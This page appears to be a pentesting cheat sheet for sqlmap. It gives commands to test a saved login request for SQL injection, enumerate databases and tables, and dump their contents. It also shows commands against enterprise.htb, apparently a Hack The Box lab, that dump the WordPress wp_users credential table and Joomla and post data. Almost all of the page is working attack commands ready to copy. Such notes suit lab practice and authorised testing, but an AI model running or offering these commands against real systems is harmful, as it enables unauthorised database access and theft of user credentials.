---
icon: sword
---

# SQLmap

{% hint style="info" %}
### <mark style="color:purple;">Operators</mark>


{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`HTTPS`</mark> <mark style="color:purple;">Sequence</mark>

{% code title="Initiates the injection test" %}
```sh
sqlmap -r login.request --force-ssl --batch
```
{% endcode %}

{% code title="Enumerate the databases" %}
```sh
sqlmap -r login.request --force-ssl --batch --dbs
```
{% endcode %}

* <mark style="color:purple;">Once you know the databases, start looking at the tables:</mark>

```sh
sqlmap -r login.request --force-ssl --batch -D DATABASE --tables
```

* <mark style="color:purple;">Dump the data from the desired tables within the database:</mark>

{% code overflow="wrap" %}
```shell
sqlmap -r login.request --force-ssl --batch -D DATABASE -T TABLE --dump
```
{% endcode %}
{% endhint %}



```bash
#Enumerate databases
sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch -dbms mysql --dbs

#Dumb a database
sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch -dbms mysql --dump --threads 10 -D wordpress  -T wp_users
sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch --dump --threads 10 -dbms mysql -D joomladb --tables
#Dumb a determinated row
sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch --dump --threads 10 -dbms mysql -D wordpress  -T wp_posts -C post_content --where "ID>=66 and ID<=68"
```

